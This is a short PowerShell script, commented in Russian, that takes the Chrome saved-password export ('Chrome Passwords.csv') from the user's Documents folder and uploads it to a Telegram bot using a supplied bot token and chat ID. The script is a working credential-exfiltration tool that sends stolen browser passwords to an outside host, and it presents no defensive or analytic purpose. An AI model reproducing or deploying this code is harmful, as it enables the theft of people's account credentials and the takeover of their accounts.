param(
    [string]$botToken,
    [string]$chatId
)

# Путь к CSV-файлу
$csvPath = "$env:USERPROFILE\Documents\Chrome Passwords.csv"

# Проверка существования файла
if (-Not (Test-Path $csvPath)) {
    Write-Host "❌ Файл не найден: $csvPath"
    exit
}

# Создаём границу (boundary) для multipart-запроса
$boundary = [System.Guid]::NewGuid().ToString()
$LF = "`r`n"

# Чтение файла в байты
$fileBytes = [System.IO.File]::ReadAllBytes($csvPath)
$fileName = [System.IO.Path]::GetFileName($csvPath)

# Собираем тело запроса вручную
$bodyLines = @()
$bodyLines += "--$boundary"
$bodyLines += "Content-Disposition: form-data; name=`"chat_id`"$LF"
$bodyLines += "$chatId"
$bodyLines += "--$boundary"
$bodyLines += "Content-Disposition: form-data; name=`"document`"; filename=`"$fileName`""
$bodyLines += "Content-Type: text/csv$LF"

# Конвертируем строковые части тела в байты
$preFileBytes = [System.Text.Encoding]::UTF8.GetBytes(($bodyLines -join $LF) + $LF)
$postFileBytes = [System.Text.Encoding]::UTF8.GetBytes("$LF--$boundary--$LF")

# Склеиваем всё: заголовок + файл + окончание
$fullBody = New-Object System.IO.MemoryStream
$fullBody.Write($preFileBytes, 0, $preFileBytes.Length)
$fullBody.Write($fileBytes, 0, $fileBytes.Length)
$fullBody.Write($postFileBytes, 0, $postFileBytes.Length)
$fullBody.Seek(0, 'Begin') | Out-Null

# Отправка запроса
$uri = "https://api.telegram.org/bot$botToken/sendDocument"
$headers = @{
    "Content-Type" = "multipart/form-data; boundary=$boundary"
}
Invoke-RestMethod -Uri $uri -Method Post -Headers $headers -Body $fullBody

Write-Host "✅ CSV-файл успешно отправлен как документ!"